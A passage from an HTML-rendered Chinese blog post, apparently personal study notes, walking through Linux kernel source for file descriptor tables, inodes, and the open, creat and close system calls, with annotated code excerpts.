class="title">rcu</span> *<span class="title">fdt</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> <span class="title">fdtab</span>;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * written part on a separate cache line in SMP</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/* 使用 ____cacheline_aligned_in_smp 可以保证file_lock是以cacheline对齐的，避免了false sharing */</span></span><br><span class="line">    <span class="type">spinlock_t</span> file_lock ____cacheline_aligned_in_smp;</span><br><span class="line">    <span class="comment">/* 用于查找下一个空闲的 fd */</span></span><br><span class="line">    <span class="type">int</span> next_fd;</span><br><span class="line">    <span class="comment">/* 保存执行exec需要关闭的文件描述符的位图*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">embedded_fd_set</span> <span class="title">close_on_exec_init</span>;</span></span><br><span class="line">    <span class="comment">/* 保存打开的文件描述符的位图 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">embedded_fd_set</span> <span class="title">open_fds_init</span>;</span></span><br><span class="line">    <span class="comment">/* fd_array为一个固定大小的file结构数组。</span></span><br><span class="line"><span class="comment">	*  struct file是内核用于文件管理的结构。这里使用默认大小的数组，就是为了可以涵盖大多数情况，避免动态分配</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> __<span class="title">rcu</span> * <span class="title">fd_array</span>[<span class="title">NR_OPEN_DEFAULT</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>下面看看<code>files_struct</code>是如何使用默认的<code>fdtab</code>和<code>fd_array</code>的，<code>init</code>是<code>Linux</code>的第一个进程，它的文件表是一个全局变量，代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> <span class="title">init_files</span> =</span> &#123;</span><br><span class="line">    .count      = ATOMIC_INIT(<span class="number">1</span>),</span><br><span class="line">    .fdt        = &amp;init_files.fdtab,</span><br><span class="line">    .fdtab      = &#123;</span><br><span class="line">        .max_fds    = NR_OPEN_DEFAULT,</span><br><span class="line">        .fd     = &amp;init_files.fd_array[<span class="number">0</span>],</span><br><span class="line">        .close_on_exec  = (fd_set *)&amp;init_files.close_on_exec_init,</span><br><span class="line">        .open_fds   = (fd_set *)&amp;init_files.open_fds_init,</span><br><span class="line">    &#125;,</span><br><span class="line">    .file_lock  = __SPIN_LOCK_UNLOCKED(init_task.file_lock),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>init_files.fdt</code>和<code>init_files.fdtab.fd</code>都分别指向了自己已有的成员变量，并以此作为一个默认值。后面的进程都是从init进程fork出来的。fork的时候会调用<code>dup_fd</code>，而在<code>dup_fd</code>中其代码结构如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">newf = kmem_cache_alloc(files_cachep, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!newf)</span><br><span class="line">   <span class="keyword">goto</span> out;</span><br><span class="line"><span class="type">atomic_set</span>(&amp;newf-&gt;count, <span class="number">1</span>);</span><br><span class="line">spin_lock_init(&amp;newf-&gt;file_lock);</span><br><span class="line">newf-&gt;next_fd = <span class="number">0</span>;</span><br><span class="line">new_fdt = &amp;newf-&gt;fdtab;</span><br><span class="line">new_fdt-&gt;max_fds = NR_OPEN_DEFAULT;</span><br><span class="line">new_fdt-&gt;close_on_exec = (fd_set *)&amp;newf-&gt;close_on_exec_init;</span><br><span class="line">new_fdt-&gt;open_fds = (fd_set *)&amp;newf-&gt;open_fds_init;</span><br><span class="line">new_fdt-&gt;fd = &amp;newf-&gt;fd_array[<span class="number">0</span>];</span><br><span class="line">new_fdt-&gt;next = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure></div>

<p>初始化new_fdt，同样是为了让new_fdt和new_fdt-&gt;fd指向其本身的成员变量fdtab和fd_array。</p>
<hr>
<p><code>/proc/pid/status</code>为对应pid的进程的当前运行状态，其中<code>FDSize</code>值即为当前进程<code>max_fds</code>的值。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /proc/3576/status </span></span><br><span class="line">Name:	su</span><br><span class="line">Umask:	0022</span><br><span class="line">State:	S (sleeping)</span><br><span class="line">Tgid:	3576</span><br><span class="line">Ngid:	0</span><br><span class="line">Pid:	3576</span><br><span class="line">PPid:	3447</span><br><span class="line">TracerPid:	0</span><br><span class="line">Uid:	1000	0	0	0</span><br><span class="line">Gid:	1000	1000	1000	1000</span><br><span class="line">FDSize:	64</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure></div>

<p>因此，初始状态下，<code>files_struct</code>，<code>fdtable</code>和<code>files</code>的关系如下图所示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/%E5%86%85%E6%A0%B8%E6%96%87%E4%BB%B6%E8%A1%A8.jpg"
                      alt="内核文件表"
                ></p>
<p>除了文件名以外的所有文件信息，都存在inode之中。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>       <span class="title">i_hash</span>;</span>              <span class="comment">/* 哈希表 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>        <span class="title">i_list</span>;</span>              <span class="comment">/* 索引节点链表 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>        <span class="title">i_dentry</span>;</span>            <span class="comment">/* 目录项链表 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span>           i_ino;               <span class="comment">/* 节点号 */</span></span><br><span class="line">        <span class="type">atomic_t</span>                i_count;             <span class="comment">/* 引用记数 */</span></span><br><span class="line">        <span class="type">umode_t</span>                 i_mode;              <span class="comment">/* 访问权限控制 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span>            i_nlink;             <span class="comment">/* 硬链接数 */</span></span><br><span class="line">        <span class="type">uid_t</span>                   i_uid;               <span class="comment">/* 使用者id */</span></span><br><span class="line">        <span class="type">gid_t</span>                   i_gid;               <span class="comment">/* 使用者id组 */</span></span><br><span class="line">        <span class="type">kdev_t</span>                  i_rdev;              <span class="comment">/* 实设备标识符 */</span></span><br><span class="line">        <span class="type">loff_t</span>                  i_size;              <span class="comment">/* 以字节为单位的文件大小 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>         <span class="title">i_atime</span>;</span>             <span class="comment">/* 最后访问时间 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>         <span class="title">i_mtime</span>;</span>             <span class="comment">/* 最后修改(modify)时间 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>         <span class="title">i_ctime</span>;</span>             <span class="comment">/* 最后改变(change)时间 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span>            i_blkbits;           <span class="comment">/* 以位为单位的块大小 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span>           i_blksize;           <span class="comment">/* 以字节为单位的块大小 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span>           i_version;           <span class="comment">/* 版本号 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span>           i_blocks;            <span class="comment">/* 文件的块数 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span>          i_bytes;             <span class="comment">/* 使用的字节数 */</span></span><br><span class="line">        <span class="type">spinlock_t</span>              i_lock;              <span class="comment">/* 自旋锁 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span>     <span class="title">i_alloc_sem</span>;</span>         <span class="comment">/* 索引节点信号量 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> *<span class="title">i_op</span>;</span>               <span class="comment">/* 索引节点操作表 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>  *<span class="title">i_fop</span>;</span>              <span class="comment">/* 默认的索引节点操作 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">super_block</span>      *<span class="title">i_sb</span>;</span>               <span class="comment">/* 相关的超级块 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">file_lock</span>        *<span class="title">i_flock</span>;</span>            <span class="comment">/* 文件锁链表 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    *<span class="title">i_mapping</span>;</span>          <span class="comment">/* 相关的地址映射 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    <span class="title">i_data</span>;</span>              <span class="comment">/* 设备地址映射 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">dquot</span>            *<span class="title">i_dquot</span>[<span class="title">MAXQUOTAS</span>];</span> <span class="comment">/* 节点的磁盘限额 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>        <span class="title">i_devices</span>;</span>           <span class="comment">/* 块设备链表 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>  *<span class="title">i_pipe</span>;</span>             <span class="comment">/* 管道信息 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span>     *<span class="title">i_bdev</span>;</span>             <span class="comment">/* 块设备驱动 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span>           i_dnotify_mask;      <span class="comment">/* 目录通知掩码 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">dnotify_struct</span>   *<span class="title">i_dnotify</span>;</span>          <span class="comment">/* 目录通知 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span>           i_state;             <span class="comment">/* 状态标志 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span>           dirtied_when;        <span class="comment">/* 首次修改时间 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span>            i_flags;             <span class="comment">/* 文件系统标志 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span>           i_sock;              <span class="comment">/* 可能是个套接字吧 */</span></span><br><span class="line">        <span class="type">atomic_t</span>                i_writecount;        <span class="comment">/* 写者记数 */</span></span><br><span class="line">        <span class="type">void</span>                    *i_security;         <span class="comment">/* 安全模块 */</span></span><br><span class="line">        __u32                   i_generation;        <span class="comment">/* 索引节点版本号 */</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="type">void</span>            *generic_ip;         <span class="comment">/* 文件特殊信息 */</span></span><br><span class="line">        &#125; u;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h1 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h1><h2 id="open-函数简介"><a href="#open-函数简介" class="headerlink" title="open 函数简介"></a>open 函数简介</h2><p>open在手册中有两个函数原型，如下所示：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags, <span class="type">mode_t</span> mode)</span>;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p> 在Linux内核中，实际上只提供了一个系统调用，对应的是上述两个函数原型中的第二个。当我们调用open函数时，实际上调用的是glibc封装的函数，然后由glibc通过自陷指令，进行真正的系统调用。也就是说，所有的系统调用都要先经过glibc才会进入操作系统。这样的话，实际上是glibc提供了一个变参函数open来满足两个函数原型，然后通过glibc的变参函数open实现真正的系统调用来调用原型二。</p>
</blockquote>
<p>函数参数<code>pathname</code>：表示要打开的文件路径。<code>flags</code>：用于指示打开文件的选项，常用的有O_RDONLY、O_WRONLY和O_RDWR。这三个选项必须有且只能有一个被指定。O_RDWR！&#x3D;O_RDONLY|O_WRONLY，Linux环境中，O_RDONLY被定义为<code>0</code>，O_WRONLY被定义为<code>1</code>，而O_RDWR却被定义为<code>2</code>。之所以有这样违反常规的设计遗留至今，就是为了兼容以前的程序。当然还有很多其他选项这里不一一列举。</p>
<h2 id="open-内核源码追踪"><a href="#open-内核源码追踪" class="headerlink" title="open 内核源码追踪"></a>open 内核源码追踪</h2><p>下面是open的内核源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_sys_open</span><span class="params">(<span class="type">int</span> dfd, <span class="type">const</span> <span class="type">char</span> __user *filename, <span class="type">int</span> flags, <span class="type">int</span> mode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">open_flags</span> <span class="title">op</span>;</span></span><br><span class="line">    <span class="comment">/* flags为用户层传递的参数，内核会对flags进行合法性检查，并根据mode生成新的flags值赋给lookup */</span></span><br><span class="line">    <span class="type">int</span> lookup = build_open_flags(flags, mode, &amp;op);</span><br><span class="line">    <span class="comment">/* 将用户空间的文件名参数复制到内核空间 */</span></span><br><span class="line">    <span class="type">char</span> *tmp = getname(filename);</span><br><span class="line">    <span class="type">int</span> fd = PTR_ERR(tmp);</span><br><span class="line">    <span class="keyword">if</span> (!IS_ERR(tmp)) &#123;</span><br><span class="line">        <span class="comment">/* 未出错则申请新的文件描述符*/</span></span><br><span class="line">        fd = get_unused_fd_flags(flags);</span><br><span class="line">        <span class="keyword">if</span> (fd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* 申请新的文件管理结构file */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span> =</span> do_filp_open(dfd, tmp, &amp;op, lookup);</span><br><span class="line">            <span class="keyword">if</span> (IS_ERR(f)) &#123;</span><br><span class="line">                put_unused_fd(fd);</span><br><span class="line">                fd = PTR_ERR(f);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* 产生文件打开的通知事件 */</span></span><br><span class="line">                fsnotify_open(f);</span><br><span class="line">                <span class="comment">/* 将文件描述符fd与文件管理结构file对应起来，即安装 */</span></span><br><span class="line">                fd_install(fd, f);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        putname(tmp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从do_sys_open可以看出，打开文件时，内核主要消耗了两种资源：文件描述符与内核管理文件结构file。</p>
<p>特别的其在<code>linux kernel 6.0</code>以上版本代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">do_sys_open</span><span class="params">(<span class="type">int</span> dfd, <span class="type">const</span> <span class="type">char</span> __user *filename, <span class="type">int</span> flags, <span class="type">umode_t</span> mode)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">open_how</span> <span class="title">how</span> =</span> build_open_how(flags, mode);</span><br><span class="line">	<span class="keyword">return</span> do_sys_openat2(dfd, filename, &amp;how);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">inline</span> <span class="keyword">struct</span> open_how <span class="title function_">build_open_how</span><span class="params">(<span class="type">int</span> flags, <span class="type">umode_t</span> mode)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">open_how</span> <span class="title">how</span> =</span> &#123;</span><br><span class="line">		.flags = flags &amp; VALID_OPEN_FLAGS,</span><br><span class="line">		.mode = mode &amp; S_IALLUGO,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* O_PATH beats everything else. */</span></span><br><span class="line">	<span class="keyword">if</span> (how.flags &amp; O_PATH)</span><br><span class="line">		how.flags &amp;= O_PATH_FLAGS;</span><br><span class="line">	<span class="comment">/* Modes should only be set for create-like flags. */</span></span><br><span class="line">	<span class="keyword">if</span> (!WILL_CREATE(how.flags))</span><br><span class="line">		how.mode = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> how;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_sys_openat2</span><span class="params">(<span class="type">int</span> dfd, <span class="type">const</span> <span class="type">char</span> __user *filename,</span></span><br><span class="line"><span class="params">			   <span class="keyword">struct</span> open_how *how)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">open_flags</span> <span class="title">op</span>;</span></span><br><span class="line">	<span class="type">int</span> fd = build_open_flags(how, &amp;op);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">filename</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fd)</span><br><span class="line">		<span class="keyword">return</span> fd;</span><br><span class="line"></span><br><span class="line">	tmp = getname(filename);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(tmp))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(tmp);</span><br><span class="line"></span><br><span class="line">	fd = get_unused_fd_flags(how-&gt;flags);</span><br><span class="line">	<span class="keyword">if</span> (fd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span> =</span> do_filp_open(dfd, tmp, &amp;op);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(f)) &#123;</span><br><span class="line">			put_unused_fd(fd);</span><br><span class="line">			fd = PTR_ERR(f);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			fd_install(fd, f);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	putname(tmp);</span><br><span class="line">	<span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>多了一道检查，借此说明，<strong>我们分析的是内核的核心逻辑，后面有机会会做新内核的安全性分析，写此系列文章也只是做一下学习笔记</strong></p>
<hr>
<p>根据POSIX标准，当获取一个新的文件描述符时，要返回最低的未使用的文件描述符。在Linux中，通过<code>do_sys_open-&gt;get_unused_fd_flags-&gt;alloc_fd(0,(flags))</code>来选择文件描述符，代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">alloc_fd</span><span class="params">(<span class="type">unsigned</span> start, <span class="type">unsigned</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> =</span> current-&gt;files;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">int</span> error;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span>;</span></span><br><span class="line">    <span class="comment">/* files为进程的文件表，下面需要更改文件表，所以需要先锁文件表 */</span></span><br><span class="line">    spin_lock(&amp;files-&gt;file_lock);</span><br><span class="line">repeat:</span><br><span class="line">    <span class="comment">/* 得到文件描述符表*/</span></span><br><span class="line">    fdt = files_fdtable(files);</span><br><span class="line">    <span class="comment">/* 从start开始，查找未用的文件描述符。在打开文件时，start为 0 */</span></span><br><span class="line">    fd = start;</span><br><span class="line">    <span class="comment">/* files-&gt;next_fd为上一次成功找到的fd的下一个描述符。使用next_fd，可以快速找到未用的文件描述符；*/</span></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; files-&gt;next_fd)</span><br><span class="line">        fd = files-&gt;next_fd;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  当小于当前文件表支持的最大文件描述符个数时，利用位图找到未用的文件描述符。</span></span><br><span class="line"><span class="comment">    *  如果大于max_fds，也就是大于当前支持的最大文件描述符，那它肯定是未用的，就不需要用位图来确认了。</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; fdt-&gt;max_fds)</span><br><span class="line">        fd = find_next_zero_bit(fdt-&gt;open_fds-&gt;fds_bits,</span><br><span class="line">            fdt-&gt;max_fds, fd);</span><br><span class="line">    <span class="comment">/* expand_files用于在必要时扩展文件表。比如当前文件描述符已经超过了当前文件表支持的最大值的时候。*/</span></span><br><span class="line">    error = expand_files(files, fd);</span><br><span class="line">    <span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * If we needed to expand the fs array we</span></span><br><span class="line"><span class="comment">    * might have blocked - try again.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (error)</span><br><span class="line">        <span class="keyword">goto</span> repeat;</span><br><span class="line">    <span class="comment">/* 只有在start小于next_fd时，才需要更新next_fd，以尽量保证文件描述符的连续性。*/</span></span><br><span class="line">    <span class="keyword">if</span> (start &lt;= files-&gt;next_fd)</span><br><span class="line">        files-&gt;next_fd = fd + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">/* 将打开文件位图open_fds对应fd的位置置位*/</span></span><br><span class="line">    FD_SET(fd, fdt-&gt;open_fds);</span><br><span class="line">    <span class="comment">/* 根据flags是否设置了O_CLOEXEC，设置或清除fdt-&gt;close_on_exec */</span></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; O_CLOEXEC)</span><br><span class="line">        FD_SET(fd, fdt-&gt;close_on_exec);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        FD_CLR(fd, fdt-&gt;close_on_exec);</span><br><span class="line">    error = fd;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line">    <span class="comment">/* Sanity check */</span></span><br><span class="line">    <span class="keyword">if</span> (rcu_dereference_raw(fdt-&gt;fd[fd]) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        printk(KERN_WARNING <span class="string">&quot;alloc_fd: slot %d not NULL!\n&quot;</span>, fd);</span><br><span class="line">        rcu_assign_pointer(fdt-&gt;fd[fd], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">out:</span><br><span class="line">    spin_unlock(&amp;files-&gt;file_lock);</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<p>前文已经说过，内核使用fd_install将文件管理结构file与fd组合起来，具体操作请看如下代码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">fd_install</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> =</span> current-&gt;files;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span>;</span></span><br><span class="line">    spin_lock(&amp;files-&gt;file_lock);</span><br><span class="line">    <span class="comment">/* 得到文件描述符表*/</span></span><br><span class="line">    fdt = files_fdtable(files);</span><br><span class="line">    BUG_ON(fdt-&gt;fd[fd] != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    *  将文件描述符表中的file类型的指针数组中对应fd的项指向file。</span></span><br><span class="line"><span class="comment">	*  这样文件描述符fd与file就建立了对应关系</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">    rcu_assign_pointer(fdt-&gt;fd[fd], file);</span><br><span class="line">    spin_unlock(&amp;files-&gt;file_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>当用户使用fd与内核交互时，内核可以用fd从<code>fdt-&gt;fd[fd]</code>中得到内部管理文件的结构struct file。</p>
<h1 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h1><h2 id="creat-函数简介"><a href="#creat-函数简介" class="headerlink" title="creat 函数简介"></a>creat 函数简介</h2><p>creat函数用于创建一个新文件，其等价于open（pathname，O_WRONLY|O_CREAT|O_TRUNC，mode）。由于历史原因，早期的Unix版本中，open的第二个参数只能是0、1或者2。这样就没有办法打开一个不存在的文件。因此，一个独立系统调用creat被引入，用于创建新文件。现在的open函数，通过使用O_CREAT和O_TRUNC选项，可以实现creat的功能，因此creat已经不是必要的了。内核creat的实现代码如下所示：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE2(creat, <span class="type">const</span> <span class="type">char</span> __user *, pathname, <span class="type">int</span>, mode)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> sys_open(pathname, O_CREAT | O_WRONLY | O_TRUNC, mode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h1><h2 id="close-内核源码追踪"><a href="#close-内核源码追踪" class="headerlink" title="close 内核源码追踪"></a>close 内核源码追踪</h2><p>close用于关闭文件描述符。而文件描述符可以是普通文件，也可以是设备，还可以是socket。在关闭时，VFS会根据不同的文件类型，执行不同的操作。下面将通过跟踪close的内核源码来了解内核如何针对不同的文件类型执行不同的操作。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE1(close, <span class="type">unsigned</span> <span class="type">int</span>, fd)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">filp</span>;</span></span><br><span class="line">    <span class="comment">/* 得到当前进程的文件表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> =</span> current-&gt;files;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span>;</span></span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    spin_lock(&amp;files-&gt;file_lock);</span><br><span class="line">    <span class="comment">/* 通过文件表，取得文件描述符表 */</span></span><br><span class="line">    fdt = files_fdtable(files);</span><br><span class="line">    <span class="comment">/* 参数fd大于文件描述符表记录的最大描述符，那么它一定是非法的描述符 */</span></span><br><span class="line">    <span class="keyword">if</span> (fd &gt;= fdt-&gt;max_fds)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    <span class="comment">/* 利用fd作为索引，得到file结构指针 */</span></span><br><span class="line">    filp = fdt-&gt;fd[fd];</span><br><span class="line">    <span class="comment">/* 检查filp是否为NULL。正常情况下，filp一定不为NULL。*/</span></span><br><span class="line">    <span class="keyword">if</span> (!filp)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    <span class="comment">/* 将对应的filp置为0 */</span></span><br><span class="line">    rcu_assign_pointer(fdt-&gt;fd[fd], <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* 清除fd在close_on_exec位图中的位*/</span></span><br><span class="line">    FD_CLR(fd, fdt-&gt;close_on_exec);</span><br><span class="line">    <span class="comment">/* 释放该fd，或者说将其置为unused。*/</span></span><br><span class="line">    __put_unused_fd(files, fd);</span><br><span class="line">    spin_unlock(&amp;files-&gt;file_lock);</span><br><span class="line">    <span class="comment">/* 关闭file结构 */</span></span><br><span class="line">    retval = filp_close(filp, files);</span><br><span class="line">    <span class="comment">/* can&#x27;t restart close syscall because file table entry was cleared */</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(retval == -ERESTARTSYS ||</span><br><span class="line">           retval == -ERESTARTNOINTR ||</span><br><span class="line">           retval == -ERESTARTNOHAND ||</span><br><span class="line">           retval == -ERESTART_RESTARTBLOCK))</span><br><span class="line">           retval = -EINTR;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">out_unlock:</span><br><span class="line">    spin_unlock(&amp;files-&gt;file_lock);</span><br><span class="line">    <span class="keyword">return</span> -EBADF;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(sys_close);</span><br></pre></td></tr></table></figure></div>

<p><code>__put_unused_fd</code>源码如下所示：</p>
